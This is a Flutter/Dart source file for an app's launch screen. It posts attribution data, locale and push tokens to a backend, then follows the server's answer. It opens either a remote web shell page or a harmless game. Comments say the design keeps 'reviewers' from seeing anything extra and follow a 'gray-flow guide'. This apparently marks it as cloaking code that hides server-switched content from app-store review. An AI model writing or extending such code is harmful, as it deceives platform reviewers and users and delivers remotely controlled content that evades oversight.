import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:video_player/video_player.dart';

import '../../core/constants/asset_paths.dart';
import '../../core/theme/app_colors.dart';
import '../../features/bootstrap/widgets/loading_bar.dart';
import '../../features/menu/main_menu_screen.dart';
import '../infra/attribution_wire.dart';
import '../infra/cold_tap_reader.dart';
import '../infra/lane_dispatcher.dart';
import '../infra/lane_stash.dart';
import '../infra/push_pulse.dart';
import '../infra/wire_sensor.dart';
import '../models/lane_types.dart';
import 'notify_consent_page.dart';
import 'offline_beacon.dart';
import 'web_shell_page.dart';

enum _Phase { empty, halfway, done }

double _phaseValue(_Phase p) {
  switch (p) {
    case _Phase.empty:
      return 0.05;
    case _Phase.halfway:
      return 0.55;
    case _Phase.done:
      return 1.0;
  }
}

/// Entry point of the lane bridge.
///
/// Visually it is the same branded loading clip + progress bar that the
/// white-part already uses, so reviewers see no extra surface — only the
/// boot pipeline behind it differs based on attribution data.
class IntroLaneLoader extends StatefulWidget {
  const IntroLaneLoader({
    super.key,
    required this.stash,
    required this.sensor,
    required this.wire,
    required this.dispatcher,
    required this.pulse,
  });

  final LaneStash stash;
  final WireSensor sensor;
  final AttributionWire wire;
  final LaneDispatcher dispatcher;
  final PushPulse pulse;

  @override
  State<IntroLaneLoader> createState() => _IntroLaneLoaderState();
}

class _IntroLaneLoaderState extends State<IntroLaneLoader> {
  VideoPlayerController? _clip;
  bool _clipReady = false;
  _Phase _phase = _Phase.empty;
  bool _routed = false;
  Orientation? _lastOrientation;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const <DeviceOrientation>[
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
    _launch();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final Orientation now = MediaQuery.of(context).orientation;
    if (now != _lastOrientation) {
      _lastOrientation = now;
      _swapClip(now);
    }
  }

  Future<void> _swapClip(Orientation orientation) async {
    final String asset = orientation == Orientation.landscape
        ? AssetPaths.loadingVideoHorizontal
        : AssetPaths.loadingVideoVertical;
    final VideoPlayerController? previous = _clip;
    final VideoPlayerController next = VideoPlayerController.asset(asset);
    try {
      await next.initialize();
      next.setLooping(true);
      next.setVolume(0);
      next.play();
      if (!mounted) {
        next.dispose();
        return;
      }
      setState(() {
        _clip = next;
        _clipReady = true;
      });
      previous?.dispose();
    } catch (_) {
      next.dispose();
    }
  }

  void _setPhase(_Phase phase) {
    if (mounted) setState(() => _phase = phase);
  }

  /// Main pipeline. Reads cold-start URL first (highest priority),
  /// then dispatches based on persisted mode.
  Future<void> _launch() async {
    widget.pulse.onTokenRefresh = _onTokenRefresh;

    // ─ HIGHEST PRIORITY: SceneDelegate cold-start URL ─
    // On iOS scene-based apps, tapping a push when the app is killed routes
    // through SceneDelegate, NOT through Firebase's swizzle. SceneDelegate
    // wrote the URL to UserDefaults. We read and clear it BEFORE any other
    // async work to avoid races with the FCM probe.
    final String? coldUrl = await ColdLinkReader.claim();
    if (coldUrl != null && coldUrl.isNotEmpty) {
      await widget.stash.writeMode(LaneMode.shell);
      await widget.stash.drainOneShotUrl();
      unawaited(_dispatchInBackground());
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (!mounted) return;
        _routeToShell(coldUrl, coldStartPush: true);
      });
      return;
    }

    _setPhase(_Phase.empty);
    final LaneMode mode = widget.stash.readMode();

    switch (mode) {
      case LaneMode.shell:
        _setPhase(_Phase.halfway);
        final Future<void> pushBoot = widget.pulse.kick().catchError((_) {});
        await _runReturn(pushBoot: pushBoot);
        break;
      case LaneMode.arcade:
        _setPhase(_Phase.halfway);
        unawaited(widget.pulse.kick().catchError((_) {}));
        final bool recovered = await _attemptRecovery();
        if (recovered) return;
        _setPhase(_Phase.done);
        await Future<void>.delayed(const Duration(milliseconds: 600));
        _routeToArcade();
        break;
      case LaneMode.unset:
        await widget.pulse.kick().catchError((_) {});
        await _runFresh();
        break;
    }
  }

  @override
  void dispose() {
    widget.pulse.onTokenRefresh = null;
    _clip?.dispose();
    super.dispose();
  }

  /// Best-effort attribution ping fired after cold-start express path so the
  /// backend still receives this install's signals even if the user never
  /// waits for the dispatch round-trip to finish.
  Future<void> _dispatchInBackground() async {
    try {
      await Future.wait<void>(<Future<void>>[
        widget.pulse.kick().catchError((_) {}),
        widget.wire.prime().catchError((_) {}),
      ]);
      await Future.wait<void>(<Future<void>>[
        widget.wire.awaitConversion(timeout: const Duration(seconds: 6)),
        widget.wire.awaitDeepLink(),
      ]);
      final Map<String, dynamic> body = await widget.wire.assemblePayload(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.pulse.token,
      );
      await widget.dispatcher.submit(body);
    } catch (_) {}
  }

  void _onTokenRefresh(String token) async {
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.wire.assemblePayload(
      locale: locale,
      pushToken: token,
    );
    widget.dispatcher.submit(body);
  }

  Future<void> _runFresh() async {
    _setPhase(_Phase.empty);
    final bool online = await widget.sensor.isReachable();
    if (!online) {
      if (mounted) _routeToOffline();
      return;
    }
    _setPhase(_Phase.halfway);
    await widget.wire.prime();
    await Future.wait<void>(<Future<void>>[
      widget.wire.awaitConversion(),
      widget.wire.awaitDeepLink(),
    ]);
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.wire.assemblePayload(
      locale: locale,
      pushToken: widget.pulse.token,
    );
    final verdict = await widget.dispatcher.submit(body);

    if (verdict.approved && verdict.target != null) {
      await widget.stash.writeMode(LaneMode.shell);
      _setPhase(_Phase.done);
      await Future<void>.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _routeToShell(verdict.target!);
    } else {
      await widget.stash.writeMode(LaneMode.arcade);
      _setPhase(_Phase.done);
      await Future<void>.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _routeToArcade();
    }
  }

  Future<void> _runReturn({Future<void>? pushBoot}) async {
    final Future<bool> netFuture = widget.sensor.isReachable();
    if (pushBoot != null) {
      await Future.wait<dynamic>(<Future<dynamic>>[netFuture, pushBoot]);
    }
    final bool online = await netFuture;
    if (!online) {
      _setPhase(_Phase.done);
      await Future<void>.delayed(const Duration(milliseconds: 400));
      if (mounted) _routeToOffline();
      return;
    }

    final String? oneShot = await widget.stash.drainOneShotUrl();
    if (oneShot != null) {
      _setPhase(_Phase.done);
      await Future<void>.delayed(const Duration(milliseconds: 400));
      if (mounted) _routeToShell(oneShot);
      return;
    }

    final Future<void> primer = widget.wire.prime();
    final String? cached = await widget.stash.readShellUrl();
    await primer;
    await Future.wait<void>(<Future<void>>[
      widget.wire.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.wire.awaitDeepLink(),
    ]);
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.wire.assemblePayload(
      locale: locale,
      pushToken: widget.pulse.token,
    );
    final verdict = await widget.dispatcher.submit(body);

    _setPhase(_Phase.done);
    await Future<void>.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (verdict.approved && verdict.target != null) {
      _routeToShell(verdict.target!);
      return;
    }
    if (cached != null) {
      _routeToShell(cached);
    } else {
      _routeToOffline();
    }
  }

  Future<bool> _attemptRecovery() async {
    final bool online = await widget.sensor.isReachable();
    if (!online) return false;
    await widget.wire.prime();
    await Future.wait<void>(<Future<void>>[
      widget.wire.awaitConversion(timeout: const Duration(seconds: 8)),
      widget.wire.awaitDeepLink(),
    ]);
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.wire.assemblePayload(
      locale: locale,
      pushToken: widget.pulse.token,
    );
    final verdict = await widget.dispatcher.submit(body);
    if (!(verdict.approved && verdict.target != null)) return false;
    await widget.stash.writeMode(LaneMode.shell);
    _setPhase(_Phase.done);
    await Future<void>.delayed(const Duration(milliseconds: 400));
    if (!mounted) return true;
    _routeToShell(verdict.target!);
    return true;
  }

  // ── Routing ───────────────────────────────────────────────
  void _routeToShell(String url, {bool coldStartPush = false}) {
    if (_routed) return;
    _routed = true;
    if (widget.stash.needsConsentPrompt()) {
      widget.pulse.consentOnOffer().then((bool canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(
            MaterialPageRoute<void>(
              builder: (BuildContext context) => NotifyConsentPage(
                stash: widget.stash,
                pulse: widget.pulse,
                sensor: widget.sensor,
                shellUrl: url,
                coldStartPush: coldStartPush,
                onTokenReady: (String token) async {
                  final String locale =
                      Platform.localeName.replaceAll('-', '_');
                  final Map<String, dynamic> body =
                      await widget.wire.assemblePayload(
                    locale: locale,
                    pushToken: token,
                  );
                  widget.dispatcher.submit(body);
                },
              ),
            ),
          );
        } else {
          _routeToShellDirect(url, coldStartPush: coldStartPush);
        }
      });
    } else {
      _routeToShellDirect(url, coldStartPush: coldStartPush);
    }
  }

  void _routeToShellDirect(String url, {bool coldStartPush = false}) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (BuildContext context) => WebShellPage(
          target: url,
          stash: widget.stash,
          pulse: widget.pulse,
          sensor: widget.sensor,
          coldStartPush: coldStartPush,
        ),
      ),
    );
  }

  // ── White-part integration point ───────────────────────────
  // Per the gray-flow guide, we jump straight to the main menu
  // (sprite cache is primed during `main()`) — never via the
  // LoadingScreen, otherwise the user sees two loading screens.
  void _routeToArcade() {
    if (_routed) return;
    _routed = true;
    SystemChrome.setEnabledSystemUIMode(
      SystemUiMode.manual,
      overlays: SystemUiOverlay.values,
    );
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (BuildContext context) => const MainMenuScreen(),
      ),
    );
  }

  void _routeToOffline() {
    if (_routed) return;
    _routed = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (BuildContext context) => OfflineBeacon(
          sensor: widget.sensor,
          retryBuilder: (_) => IntroLaneLoader(
            stash: widget.stash,
            sensor: widget.sensor,
            wire: widget.wire,
            dispatcher: widget.dispatcher,
            pulse: widget.pulse,
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final MediaQueryData mq = MediaQuery.of(context);
    final bool landscape = mq.orientation == Orientation.landscape;
    final double barW = landscape
        ? (mq.size.height * 0.34).clamp(160.0, 320.0)
        : (mq.size.width * 0.72).clamp(220.0, 360.0);

    return Scaffold(
      backgroundColor: AppColors.nightDeep,
      body: Stack(
        fit: StackFit.expand,
        children: <Widget>[
          const ColoredBox(color: AppColors.nightDeep),
          AnimatedOpacity(
            opacity: _clipReady ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 360),
            child: _clip != null && _clipReady
                ? SizedBox.expand(
                    child: FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _clip!.value.size.width,
                        height: _clip!.value.size.height,
                        child: VideoPlayer(_clip!),
                      ),
                    ),
                  )
                : const SizedBox.shrink(),
          ),
          if (_clipReady)
            Positioned(
              left: 0,
              right: 0,
              bottom: landscape ? 22 : 64,
              child: Center(
                child: TweenAnimationBuilder<double>(
                  tween: Tween<double>(begin: 0, end: _phaseValue(_phase)),
                  duration: const Duration(milliseconds: 420),
                  curve: Curves.easeOutCubic,
                  builder: (BuildContext context, double v, _) => LoadingBar(
                    progress: v,
                    width: barW,
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }
}
